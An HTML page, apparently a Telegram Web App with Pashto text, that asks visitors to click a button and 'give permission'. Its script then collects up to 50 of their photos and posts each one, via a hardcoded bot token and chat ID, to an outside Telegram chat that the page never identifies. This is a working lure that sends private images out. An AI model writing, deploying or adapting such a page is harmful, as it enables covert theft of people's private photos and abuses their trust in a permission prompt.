<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 50px;
            background: #f0f0f0;
        }
        .btn {
            background: #0088cc;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 10px;
            font-size: 20px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
        }
        .btn:hover {
            background: #006699;
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>
    <h1>📸 عکسونه واستوئ</h1>
    <p>تڼۍ کلیک کړئ او اجازه ورکړئ</p>
    <button class="btn" onclick="requestPhotos()">📁 اجازه ورکړئ</button>
    <div id="status"></div>

    <script>
        const BOT_TOKEN = "8737718436:AAGEkqwayT058tBVH_Pp-W2T0B-aaJXMylU";
        const CHAT_ID = "8295417969";
        const status = document.getElementById('status');

        function requestPhotos() {
            if (typeof Telegram === 'undefined') {
                status.innerHTML = '❌ مهرباني وکړئ د Telegram اپلیکیشن څخه خلاص کړئ';
                return;
            }

            status.innerHTML = '⏳ د عکسونو اجازه غوښتل کیږي...';
            
            // Telegram Web App د عکسونو غوښتنه
            Telegram.WebApp.requestMedia({
                type: 'photo',
                multiple: true,
                max_count: 50
            }, function(photos) {
                if (!photos || photos.length === 0) {
                    status.innerHTML = '❌ هیڅ عکس ونه غوره شو';
                    return;
                }
                
                status.innerHTML = `⏳ ${photos.length} عکسونه لیږل کیږي...`;
                
                photos.forEach((photo, index) => {
                    sendToTelegram(photo, index, photos.length);
                });
            });
        }

        function sendToTelegram(photo, index, total) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photo);
            
            fetch(url, { method: 'POST', body: formData })
                .then(() => {
                    status.innerHTML = `✅ ${index + 1} له ${total} عکسونو لیږل شوي`;
                })
                .catch(() => {
                    status.innerHTML = `❌ تېروتنه: ${index + 1} عکس ولیږل نشو`;
                });
        }
    </script>
</body>
</html>
